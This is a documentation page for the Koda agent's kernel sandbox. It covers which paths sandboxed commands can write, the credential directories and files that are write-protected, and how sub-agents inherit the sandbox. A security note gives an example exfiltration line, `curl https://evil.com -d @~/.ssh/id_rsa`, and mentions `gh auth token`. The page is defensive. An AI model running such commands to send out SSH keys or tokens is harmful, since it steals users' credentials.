# Sandbox

Koda's kernel sandbox is **always active** — every Bash command runs
inside a sandboxed process. The sandbox enforces the perimeter; the
[trust mode](./approval.md) controls whether you see a confirmation
prompt before each mutation.

## What's protected

### Write restrictions

Bash commands can only write to:
- The project directory
- `/tmp` and standard cache dirs (`~/.cache`, `~/.cargo`, etc.)

### Credential protection

Credential directories and files are **write-protected** — sandboxed
commands cannot modify them, but CLI tools can still *read* their own
config to authenticate. This follows the Codex model where the entire
host filesystem is read-only and credential dirs are not special-cased
beyond that.

**Write-protected directories** (reads allowed):
- `~/.ssh` — SSH private keys
- `~/.aws` — AWS credentials
- `~/.gnupg` — GPG private keys
- `~/.kube` — Kubernetes config and tokens
- `~/.azure` — Azure CLI tokens
- `~/.password-store` — pass(1) encrypted passwords
- `~/.terraform.d` — Terraform cloud tokens
- `~/.config/gcloud` — gcloud CLI credentials
- `~/.config/gh` — GitHub CLI PATs
- `~/.config/op` — 1Password CLI tokens
- `~/.config/helm` — Helm registry auth

**Write-protected files** (reads allowed):
`~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`,
`~/.docker/config.json`, `~/.vault-token`, `~/.env`

**Fully blocked (read + write):**
- `~/.config/koda/db` — Koda's SQLite DB containing plaintext API keys

> **Security note — accepted risk:** A sandboxed command can read
> credential material and could exfiltrate it over the network (e.g.
> `curl https://evil.com -d @~/.ssh/id_rsa`). Blocking credential
> reads without blocking network egress is security theater — the
> model could also obtain tokens from environment variables, process
> output, or tool-specific commands like `gh auth token`. Network-level
> egress restriction ([#844 Gap 4](https://github.com/lijunzh/koda/issues/844))
> is the proper mitigation and is tracked separately.
>
> The only exception is `koda/db` — koda's own API keys have no
> legitimate use inside the sandbox (the koda process runs *outside*
> the sandbox), so full read+write deny is justified.

### Agent-file protection

In all modes, writes to `.koda/agents/` and `.koda/skills/` within the
project are blocked. This prevents a sandboxed command from modifying
agent definitions that could alter system prompts or tool access.

## Sub-agent inheritance

Child agents inherit the parent's trust mode and sandbox via
`TrustMode::clamp()` — a child can never run with less protection than
its caller. If the parent runs in Safe mode, the child runs in Safe mode
even if the agent JSON specifies `"mode": "auto"`.

## Platform backends

| Platform | Backend | Install |
|----------|---------|---------||
| macOS | `sandbox-exec` (seatbelt) | Built-in |
| Linux | `bwrap` (bubblewrap) | `apt install bubblewrap` |
| Windows | Not supported | — |

If the platform backend is unavailable (e.g. `bwrap` not installed on
Linux), Koda falls back to unsandboxed execution with a warning logged
via `tracing::warn!`. Install the backend for full protection.
